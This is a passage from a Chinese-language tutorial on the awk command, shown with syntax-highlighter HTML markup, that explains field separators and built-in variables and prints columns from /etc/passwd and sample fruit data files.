data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk -F ':' '{print $1}' /etc/passwd\r\nroot\r\nbin\r\ndaemon\r\nadm\r\nlp\r\nsync\r\nshutdown\r\nhalt\r\nmail\r\noperator\r\ngames\r\nftp\r\nnobody</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7f607979507-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af7f607979507-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7f607979507-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af7f607979507-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7f607979507-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af7f607979507-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7f607979507-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af7f607979507-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7f607979507-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af7f607979507-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7f607979507-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af7f607979507-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7f607979507-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af7f607979507-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af7f607979507-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">F</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">':'</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $1}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af7f607979507-2\"><span class=\"crayon-e\">root</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af7f607979507-3\"><span class=\"crayon-e\">bin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af7f607979507-4\"><span class=\"crayon-e\">daemon</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af7f607979507-5\"><span class=\"crayon-e\">adm</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af7f607979507-6\"><span class=\"crayon-e\">lp</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af7f607979507-7\"><span class=\"crayon-e\">sync</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af7f607979507-8\"><span class=\"crayon-e\">shutdown</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af7f607979507-9\"><span class=\"crayon-e\">halt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af7f607979507-10\"><span class=\"crayon-e\">mail</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af7f607979507-11\"><span class=\"crayon-e\">operator</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af7f607979507-12\"><span class=\"crayon-e\">games</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af7f607979507-13\"><span class=\"crayon-e\">ftp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af7f607979507-14\"><span class=\"crayon-v\">nobody</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>上面的命令将 /etc/passwd 文件中的每一行用冒号 <em>:</em> 分割成多个字段，然后用 print 将第 1 列字段的内容打印输出</p>\n<p><strong>如何在 awk 中同时指定多个分隔符</strong></p>\n<p>比如现在有这样一个文件 some.log 文件内容如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af83958078695\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nGrape(100g)1980\r\nraisins(500g)1990\r\nplum(240g)1997\r\napricot(180g)2005\r\nnectarine(200g)2008</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af83958078695-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af83958078695-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af83958078695-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af83958078695-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af83958078695-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af83958078695-1\"><span class=\"crayon-e\">Grape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">100g</span><span class=\"crayon-sy\">)</span><span class=\"crayon-cn\">1980</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af83958078695-2\"><span class=\"crayon-e\">raisins</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">500g</span><span class=\"crayon-sy\">)</span><span class=\"crayon-cn\">1990</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af83958078695-3\"><span class=\"crayon-e\">plum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">240g</span><span class=\"crayon-sy\">)</span><span class=\"crayon-cn\">1997</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af83958078695-4\"><span class=\"crayon-e\">apricot</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">180g</span><span class=\"crayon-sy\">)</span><span class=\"crayon-cn\">2005</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af83958078695-5\"><span class=\"crayon-e\">nectarine</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">200g</span><span class=\"crayon-sy\">)</span><span class=\"crayon-cn\">2008</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在我们想将上面的 some.log 文件中按照 “水果名称(重量)年份” 来进行分割</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af86959847346\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk -F '[()]' '{print $1, $2, $3}' some.log\r\nGrape 100g 1980\r\nraisins 500g 1990\r\nplum 240g 1997\r\napricot 180g 2005\r\nnectarine 200g 2008</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af86959847346-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af86959847346-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af86959847346-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af86959847346-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af86959847346-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af86959847346-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af86959847346-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">F</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'[()]'</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $1, $2, $3}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">some</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af86959847346-2\"><span class=\"crayon-i\">Grape</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100g</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1980</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af86959847346-3\"><span class=\"crayon-i\">raisins</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">500g</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1990</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af86959847346-4\"><span class=\"crayon-i\">plum</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">240g</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1997</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af86959847346-5\"><span class=\"crayon-i\">apricot</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">180g</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2005</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af86959847346-6\"><span class=\"crayon-i\">nectarine</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">200g</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2008</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>在 <code>-F</code> 参数中使用一对方括号来指定多个分隔符，awk 处理 some.log 文件时就会使用 “(” 和 “)” 来对文件的每一行进行分割。</p>\n<p><strong>awk 内置变量的使用</strong></p>\n<p><code>$0</code> 这个表示文本处理时的当前行</p>\n<p><code>$1</code> 表示文本行被分隔后的第 1 个字段列</p>\n<p><code>$2</code> 表示文本行被分割后的第 2 个字段列</p>\n<p><code>$3</code> 表示文本行被分割后的第 3 个字段列</p>\n<p><code>$n</code> 表示文本行被分割后的第 n 个字段列</p>\n<p><code>NR</code> 表示文件中的行号，表示当前是第几行</p>\n<p><code>NF</code> 表示文件中的当前行列的个数，类似于 mysql 数据表里面每一条记录有多少个字段</p>\n<p><code>FS</code> 表示 awk 的输入分隔符，默认分隔符为空格和制表符，你可以对其进行自定义设置</p>\n<p><code>OFS</code> 表示 awk 的输出分隔符，默认为空格，你也可以对其进行自定义设置</p>\n<p><code>FILENAME</code> 表示当前文件的文件名称，如果同时处理多个文件，它也表示当前文件名称</p>\n<p>比如我们有这么一个文本文件 fruit.txt 内容如下，我将用它来向你演示如何使用 awk 命令工具，顺便活跃一下此时尴尬的气氛。。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af8a260461460\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npeach    100   Mar  1997   China\r\nLemon    150   Jan  1986   America\r\nPear     240   Mar  1990   Janpan\r\navocado  120   Feb  2008   china</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af8a260461460-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af8a260461460-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af8a260461460-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af8a260461460-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af8a260461460-1\"><span class=\"crayon-i\">peach</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1997</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">China</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af8a260461460-2\"><span class=\"crayon-i\">Lemon</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1986</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">America</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af8a260461460-3\"><span class=\"crayon-i\">Pear</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">240</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1990</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">Janpan</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af8a260461460-4\"><span class=\"crayon-i\">avocado</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2008</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">china</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>我们来瞧一瞧下面这些简单到爆炸的例子，这个表示打印输出文件的每一整行的内容</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af8e243048135\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print $0}' fruit.txt\r\npeach    100   Mar  1997   China\r\nLemon    150   Jan  1986   America\r\nPear     240   Mar  1990   Janpan\r\navocado  120   Feb  2008   china</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af8e243048135-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af8e243048135-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af8e243048135-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af8e243048135-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af8e243048135-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af8e243048135-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af8e243048135-2\"><span class=\"crayon-i\">peach</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1997</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">China</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af8e243048135-3\"><span class=\"crayon-i\">Lemon</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1986</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">America</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af8e243048135-4\"><span class=\"crayon-i\">Pear</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">240</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1990</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">Janpan</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af8e243048135-5\"><span class=\"crayon-i\">avocado</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2008</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">china</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>下面这个表示打印输出文件的每一行的第 1 列内容</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af91904876263\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print $1}' fruit.txt\r\npeach\r\nLemon\r\nPear\r\navocado</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af91904876263-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af91904876263-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af91904876263-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af91904876263-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af91904876263-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af91904876263-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $1}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af91904876263-2\"><span class=\"crayon-e\">peach</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af91904876263-3\"><span class=\"crayon-e\">Lemon</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af91904876263-4\"><span class=\"crayon-e\">Pear</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af91904876263-5\"><span class=\"crayon-v\">avocado</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>下面面这个表示打印输出文件的每一行的第 1 列、第 2 列和第 3 列内容</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af94175501090\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 